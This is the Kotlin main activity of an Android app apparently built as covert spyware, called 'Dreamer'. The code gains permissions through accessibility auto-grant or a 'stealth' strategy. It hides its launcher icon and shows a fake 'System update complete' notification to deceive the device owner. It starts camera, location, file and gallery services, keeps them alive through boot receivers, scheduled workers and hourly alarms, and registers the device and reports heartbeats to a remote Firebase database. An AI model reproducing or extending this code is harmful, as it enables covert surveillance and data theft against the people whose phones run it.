package com.h4k3r.dreamer

import android.Manifest
import android.app.ActivityManager
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DeviceAdminReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import androidx.work.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.security.MessageDigest
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.*

class MainActivity : ComponentActivity() {

    /* ── Configuration ──────────────────────────── */
    private val PERMISSION_STRATEGY = 3 // 1, 2, or 3 based on your preference

    /* ── Device ID Generation ─────────────────────── */
    private fun deviceId(): String {
        val androidId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        return MessageDigest.getInstance("SHA-256")
            .digest(androidId.toByteArray())
            .take(6)
            .joinToString("") { "%02x".format(it) }
    }

    /* ── Secret Key from Assets ─────────────────── */
    private fun getSecretKey(): String? {
        return try {
            assets.open("secret_key.txt")
                .bufferedReader()
                .readLine()
                ?.trim()
                ?.takeIf { it.isNotEmpty() }
        } catch (e: Exception) {
            null
        }
    }

    /* ── Enhanced Lifecycle ──────────────────────────── */
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Get secret key
        val secretKey = getSecretKey()
        if (secretKey == null) {
            Toast.makeText(
                this,
                "⚠️ Configuration Error: Missing secret_key.txt in assets folder",
                Toast.LENGTH_LONG
            ).show()
            finish()
            return
        }

        // Get device ID
        val deviceId = deviceId()

        // Store key and device ID in shared preferences for services
        getSharedPreferences("dreamer_auth", MODE_PRIVATE).edit().apply {
            putString("secret_key", secretKey)
            putString("device_id", deviceId)
            apply()
        }

        // Register device info in Firebase
        registerDevice(secretKey, deviceId)

        // Execute permission strategy based on configuration
        when (PERMISSION_STRATEGY) {
            1 -> executeStrategy1() // Accessibility-based
            2 -> executeStrategy2() // Smart Permission Manager
            3 -> executeStrategy3() // Stealth System
        }

        // Setup background persistence
        setupBackgroundPersistence()

        // Show subtle success message
        showSuccessAnimation()
    }

    /* ═══════════════════════════════════════════════════ */
    /* ── STRATEGY 1: Accessibility-Based Auto Grant ───── */
    /* ═══════════════════════════════════════════════════ */
    private fun executeStrategy1() {
        // First enable accessibility service
        if (!isAccessibilityServiceEnabled()) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)

            Toast.makeText(
                this,
                "Please enable 'Dreamer' accessibility service",
                Toast.LENGTH_LONG
            ).show()

            // Wait for user to enable, then auto-grant all permissions
            GlobalScope.launch {
                delay(3000)
                while (!isAccessibilityServiceEnabled()) {
                    delay(1000)
                }

                // Now accessibility is enabled, trigger auto-grant
                withContext(Dispatchers.Main) {
                    DreamerAccessibilityService.instance?.autoGrantAllPermissions()
                }
            }
        } else {
            // Already enabled, trigger auto-grant
            DreamerAccessibilityService.instance?.autoGrantAllPermissions()
        }
    }

    /* ═══════════════════════════════════════════════════ */
    /* ── STRATEGY 2: Smart Permission Manager ────────── */
    /* ═══════════════════════════════════════════════════ */
    private fun executeStrategy2() {
        val permissionManager = SmartPermissionManager.getInstance(this)

        // Start initial setup
        permissionManager.performInitialSetup()

        // Request all permissions with smart flow
        permissionManager.requestAllPermissions { results ->
            // Update Firebase with results
            updatePermissionsInFirebase(results)

            // Start services for granted permissions
            startServicesBasedOnPermissions(results)

            // Hide app after setup
            GlobalScope.launch {
                delay(5000)
                withContext(Dispatchers.Main) {
                    hideApp()
                }
            }
        }
    }

    /* ═══════════════════════════════════════════════════ */
    /* ── STRATEGY 3: Ultimate Stealth System ─────────── */
    /* ═══════════════════════════════════════════════════ */
    private fun executeStrategy3() {
        val stealthSystem = StealthPermissionSystem.getInstance(this)

        // Initialize stealth system
        stealthSystem.initialize()

        // Start all services immediately (they'll wait for permissions)
        startAllServices()

        // Schedule permission checks
        scheduleStealthPermissionChecks()

        // Hide app immediately
        GlobalScope.launch {
            delay(2000)
            withContext(Dispatchers.Main) {
                hideApp()
                showStealthNotification()
            }
        }
    }

    /* ── Helper Functions ────────────────────────────── */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        return enabledServices.contains(packageName)
    }

    private fun hideApp() {
        // Method 1: Disable launcher icon
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // Method 2: Finish activity
        finishAndRemoveTask()
    }

    private fun showSuccessAnimation() {
        // Create a subtle toast
        Toast.makeText(
            this,
            "✅ Setup complete",
            Toast.LENGTH_SHORT
        ).show()
    }

    private fun showStealthNotification() {
        // Show a system-like notification
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                "system",
                "System",
                android.app.NotificationManager.IMPORTANCE_MIN
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notification = androidx.core.app.NotificationCompat.Builder(this, "system")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle("System update complete")
            .setContentText("All features are now available")
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(1234, notification)
    }

    private fun startAllServices() {
        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java,
            PermissionMonitorService::class.java
        )

        services.forEach { serviceClass ->
            try {
                val intent = Intent(this, serviceClass)
                ContextCompat.startForegroundService(this, intent)
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Failed to start service", e)
            }
        }
    }

    private fun startServicesBasedOnPermissions(permissions: Map<String, Boolean>) {
        if (permissions["camera"] == true) {
            startService(Intent(this, CameraService::class.java))
        }

        if (permissions["location_fine"] == true || permissions["location_coarse"] == true) {
            startService(Intent(this, DataService::class.java))
        }

        if (permissions["storage_read"] == true || permissions["all_files_access"] == true) {
            startService(Intent(this, FilesService::class.java))
            startService(Intent(this, GalleryService::class.java))
        }

        // Always start permission monitor
        startService(Intent(this, PermissionMonitorService::class.java))
    }

    private fun scheduleStealthPermissionChecks() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, StealthPermissionReceiver::class.java).apply {
            action = "com.h4k3r.dreamer.CHECK_PERMISSIONS"
        }

        val pendingIntent = PendingIntent.getBroadcast(
            this,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Check every hour
        alarmManager.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 60_000,
            60 * 60 * 1000,
            pendingIntent
        )
    }

    /* ── Enhanced Firebase Registration ──────────────── */
    private fun registerDevice(key: String, deviceId: String) {
        val deviceInfo = mapOf(
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "android" to Build.VERSION.SDK_INT,
            "sdk_name" to Build.VERSION.RELEASE,
            "time" to System.currentTimeMillis(),
            "app_version" to "3.0.0",
            "battery" to getBatteryLevel(),
            "storage" to getStorageInfo(),
            "strategy" to PERMISSION_STRATEGY
        )

        Firebase.database.reference
            .child("devices")
            .child(key)
            .child(deviceId)
            .child("info")
            .setValue(deviceInfo)
    }

    private fun updatePermissionsInFirebase(permissions: Map<String, Boolean>) {
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        val key = prefs.getString("secret_key", null)
        val deviceId = prefs.getString("device_id", null)

        if (key != null && deviceId != null) {
            Firebase.database.reference
                .child("devices")
                .child(key)
                .child(deviceId)
                .child("info")
                .child("permissions")
                .setValue(permissions)
        }
    }

    /* ── Background Persistence Setup ──────────────── */
    private fun setupBackgroundPersistence() {
        // Schedule WorkManager periodic task
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
            .setRequiresBatteryNotLow(false)
            .build()

        val keepAliveWork = PeriodicWorkRequestBuilder<KeepAliveWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .addTag("dreamer_keepalive")
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "dreamer_keepalive",
            ExistingPeriodicWorkPolicy.REPLACE,
            keepAliveWork
        )

        // Enable boot receiver
        val receiver = ComponentName(this, BootReceiver::class.java)
        packageManager.setComponentEnabledSetting(
            receiver,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )

        // Request battery optimization exemption (silent)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    // Ignore if not available
                }
            }
        }
    }

    /* ── Helper Methods ─────────────────────────── */
    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(
            null,
            android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
        val level = batteryIntent?.getIntExtra("level", -1) ?: -1
        val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
        return if (level != -1 && scale != -1) {
            (level * 100 / scale)
        } else {
            -1
        }
    }

    private fun getStorageInfo(): Map<String, Long> {
        val stat = android.os.StatFs(Environment.getExternalStorageDirectory().path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong

        return mapOf(
            "total" to totalBlocks * blockSize,
            "available" to availableBlocks * blockSize
        )
    }
}

/* ── Enhanced KeepAlive Worker for Background Persistence ── */
class KeepAliveWorker(
    context: Context,
    params: WorkerParameters
) : Worker(context, params) {

    override fun doWork(): Result {
        // Restart services if they're not running and have required permissions
        val servicesWithPermissions = mapOf(
            CameraService::class.java to listOf(android.Manifest.permission.CAMERA),
            DataService::class.java to listOf(android.Manifest.permission.ACCESS_FINE_LOCATION),
            FilesService::class.java to listOf(
                if (Build.VERSION.SDK_INT >= 33) android.Manifest.permission.READ_MEDIA_IMAGES
                else android.Manifest.permission.READ_EXTERNAL_STORAGE
            ),
            GalleryService::class.java to listOf(
                if (Build.VERSION.SDK_INT >= 33) android.Manifest.permission.READ_MEDIA_IMAGES
                else android.Manifest.permission.READ_EXTERNAL_STORAGE
            ),
            PermissionMonitorService::class.java to emptyList<String>()
        )

        servicesWithPermissions.forEach { (serviceClass, requiredPermissions) ->
            if (!isServiceRunning(serviceClass)) {
                val hasAllPermissions = requiredPermissions.all { permission ->
                    androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, permission) ==
                            android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (hasAllPermissions) {
                    try {
                        val intent = Intent(applicationContext, serviceClass)
                        androidx.core.content.ContextCompat.startForegroundService(applicationContext, intent)
                    } catch (e: Exception) {
                        android.util.Log.e("KeepAliveWorker", "Failed to start service: ${serviceClass.simpleName}", e)
                    }
                } else {
                    android.util.Log.w("KeepAliveWorker", "Skipping ${serviceClass.simpleName} - missing permissions: $requiredPermissions")
                }
            }
        }

        // Update heartbeat in Firebase
        updateHeartbeat()

        return Result.success()
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    private fun updateHeartbeat() {
        val prefs = applicationContext.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        val key = prefs.getString("secret_key", null)
        val deviceId = prefs.getString("device_id", null)

        if (key != null && deviceId != null) {
            Firebase.database.reference
                .child("devices")
                .child(key)
                .child(deviceId)
                .child("info")
                .child("last_heartbeat")
                .setValue(System.currentTimeMillis())
        }
    }
}